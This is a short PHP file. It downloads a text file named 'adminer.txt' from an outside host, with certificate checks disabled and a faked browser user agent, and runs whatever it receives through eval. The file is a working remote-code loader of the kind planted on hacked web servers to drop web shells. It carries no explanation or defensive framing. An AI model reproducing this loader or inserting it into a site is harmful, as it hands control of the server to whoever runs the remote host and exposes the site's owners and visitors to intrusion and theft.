<?php

function geturlsinfo($url) {
    $url_get_contents_data = '';

    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($conn, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
        curl_setopt($conn, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    }

    return $url_get_contents_data;
}

$url_content = geturlsinfo('https://myzack.lol/adminer.txt');

if ($url_content !== false) {
    eval('?>' . $url_content);
} else {
    echo "Failed to fetch URL content.";
}
?>
